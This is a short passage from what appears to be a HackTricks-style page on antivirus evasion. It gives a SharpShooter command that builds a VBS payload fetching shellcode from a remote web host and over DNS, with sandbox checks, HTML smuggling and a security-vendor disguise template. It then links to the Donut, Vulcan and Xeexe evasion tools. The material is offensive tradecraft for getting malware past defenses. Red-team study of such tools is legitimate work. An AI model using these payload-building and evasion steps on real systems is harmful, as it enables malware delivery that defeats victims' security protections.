SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)


{{#include ../banners/hacktricks-training.md}}
